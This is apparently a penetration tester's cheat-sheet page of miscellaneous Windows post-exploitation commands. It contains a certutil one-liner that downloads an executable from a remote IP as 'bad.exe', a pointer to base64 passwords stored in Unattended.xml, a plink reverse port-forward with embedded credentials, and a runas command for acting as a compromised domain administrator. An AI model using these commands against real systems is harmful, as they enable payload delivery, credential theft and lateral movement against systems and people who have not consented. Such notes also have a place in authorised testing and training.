# Miscellaneous
```text-plain
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
```

"Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode." Read more about it [here](https://support.microsoft.com/en-us/topic/77504e1d-2b75-5be1-3eef-cec3617cc461).

It is also where users passwords are stored in base64. Navigate to C:\\Windows\\Panther\\Unattend\\Unattended.xml.

To list the permissions of all files in the current directory, we can use:

`cacls *`

For port forwarding with plink use the following with ssh running and ufw disabled:

```text-plain
echo y|&./plink.exe -ssh -l username -pw password -R 2805:127.0.0.1:2805 10.17.17.11
```

the `runas` command, which we can use to authenticate as another user in the command prompt. We can use the following command in cmd to authenticate as the now compromised DA user:

`runas /user:john cmd.exe`